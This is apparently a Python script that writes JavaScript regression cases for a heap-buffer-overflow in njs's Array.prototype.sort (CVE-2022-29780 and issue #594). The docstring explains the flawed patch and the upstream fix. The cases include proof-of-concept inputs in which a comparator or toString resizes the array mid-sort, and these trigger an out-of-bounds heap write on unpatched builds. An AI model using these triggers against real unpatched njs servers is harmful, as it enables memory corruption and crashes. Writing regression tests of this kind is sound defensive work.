"""Residual case set for njs.cve-2022-29780: a comparator (or an element's
toString under the default comparison) that RESIZES the receiver while it
stays a fast array, as opposed to converting it to a slow array.

Usage: python3 sortconv_residual_cases.py OUTDIR

This is a second case set, separate from scripts/sortconv_cases.py.  The
developer patch (8b39afda) guards the write-back with
`fast_path && njs_is_fast_array(this)`, which handles the conversion to a
slow array (the reported failure #486/#468) but not a resize of a fast
array.  Issue #594 ("heap-buffer-overflow in njs_array_prototype_sort",
2022-10-22) reaches the second state: the default sort converts each object
element to a string, which calls the element's toString, and that toString
shifts the receiver (`Array.prototype.shift.call(a)`), advancing
`array->start` and decrementing `array->length` while the array stays fast.
The write-back fast branch (entered because njs_is_fast_array is still true)
then writes `start[i]` for i up to the pre-sort `len` against the advanced
`start`, a heap-buffer-overflow WRITE (src/njs_array.c, the write-back loop).
Upstream commit 5f4b5f27 ("Fixed Array.prototype.sort() when array is
changed while sorting.", closes #594) adds `&& njs_array(this)->length ==
length` to the write-back condition, which fixes it.

Observable: each case runs the sort inside out() and returns the fixed
string 'done'.  A run that does not crash prints `string:done`; the exact
post-sort contents are engine-specific under a resizing sort and are not the
object of this set, which tests only crash vs no-crash.

Cases:
  resid_shift_tostr  the issue #594 PoC shape: a 200-element fast array of
                     one object whose toString shifts the array; default sort
                     (no comparefn), so the string conversion calls toString.
  resid_shift_cmp    a comparefn that shifts the receiver each comparison
                     (the same start-advancing resize, reached through a
                     comparefn instead of toString).
  resid_pop_cmp      a comparefn that pops the receiver each comparison
                     (length decremented, start not advanced): a resize that
                     does not advance the buffer pointer.
  resid_push_cmp     a comparefn that pushes to the receiver each comparison
                     (the array grows and may be reallocated); the write-back
                     re-reads array->start, so this is a control expected not
                     to crash on any build.
"""
import sys
from pathlib import Path

PRELUDE = r"""
function show(v) { return typeof v + ':' + String(v); }
function out(f) { var r; try { r = show(f()); } catch (e) { r = 'E:' + e.name; } console.log(r); }
"""

CASES = {
    "resid_shift_tostr":
        "var a=[]; var b={toString:function(){ Array.prototype.shift.call(a); return ''; }}; "
        "for (var c=0;c<200;c++) a[c]=b; Array.prototype.sort.call(a); return 'done';",
    "resid_shift_cmp":
        "var a=[]; for (var c=0;c<200;c++) a[c]=c; "
        "a.sort(function(x,y){ Array.prototype.shift.call(a); return 0; }); return 'done';",
    "resid_pop_cmp":
        "var a=[]; for (var c=0;c<200;c++) a[c]=c; "
        "a.sort(function(x,y){ a.pop(); return 0; }); return 'done';",
    "resid_push_cmp":
        "var a=[2,1]; "
        "a.sort(function(x,y){ a.push(0); return 0; }); return 'done';",
}


def main(outdir):
    out = Path(outdir)
    out.mkdir(parents=True, exist_ok=True)
    rows = ["\t".join(["case", "absent"])]
    for name in sorted(CASES):
        (out / (name + ".js")).write_text(PRELUDE + "out(function() { " + CASES[name] + " });\n")
        rows.append("\t".join([name, "none"]))
    (out / "cases.tsv").write_text("\n".join(rows) + "\n")
    print(f"{len(CASES)} residual cases written to {outdir}")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        sys.exit("usage: python3 sortconv_residual_cases.py OUTDIR")
    main(sys.argv[1])
